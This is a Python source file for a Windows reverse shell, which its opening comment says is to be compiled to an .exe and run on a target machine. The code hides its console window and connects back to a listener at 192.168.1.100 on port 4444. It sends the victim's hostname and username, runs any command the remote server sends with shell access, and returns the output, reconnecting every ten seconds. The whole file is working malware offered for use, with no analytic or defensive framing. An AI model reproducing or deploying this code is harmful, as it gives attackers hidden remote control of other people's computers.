# this file will be turned to .exe and run on the windows target


#!/usr/bin/env python

import socket
import threading
import subprocess
import os
import time
import sys


def connect_back():
    SERVER_IP = "192.168.1.100"
    SERVER_PORT = 4444
    print("[*] Connecting to server...")

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            print("[*] Connected to server")

            info = "[*] Windows host connected"
            info += f"[*] Hostname: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
            info += f"[*] Username: {os.environ.get('USERNAME', 'Unknown')}\n"
            client.send(info.encode() + b"\n")

            while True:
                cmd = client.recv(4096).decode("utf-8", errors="ignore").strip()
                if not cmd:
                    break
                if cmd.lower() in ["exit", "quit"]:
                    client.send(b"EXITING...")
                    break

                try:
                    if cmd.startswith("cd"):
                        try:
                            new_dir = cmd[3:].strip()
                            os.chdir(new_dir)
                            output = f"[*] Changed directory to {os.getcwd()}\n"
                        except Exception as e:
                            output = f"[!] Error: {str(e)}\n"
                    else:
                        process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True,
                            text=True,
                        )
                        stdout, stderr = process.communicate()

                        if stdout:
                            output = stdout
                        elif stderr:
                            output = stderr
                        else:
                            output = "[*] Command succesfully executed\n"
                except Exception as e:
                    output = f"[!] Error: {str(e)}\n"
                try:
                    client.send(output.encode("utf-8"))
                except:
                    break

            client.close()
            print("[*] Disconnecting from server...")
            time.sleep(10)
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            print("[*] Reconnecting to server in 10 seconds...")
            time.sleep(10)


if __name__ == "__main__":
    print("[*] Windows Reverse Shell")
    print("[*} Connecting to server...")
    try:
        import ctypes

        ctypes.windll.kernel32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    connect_back()
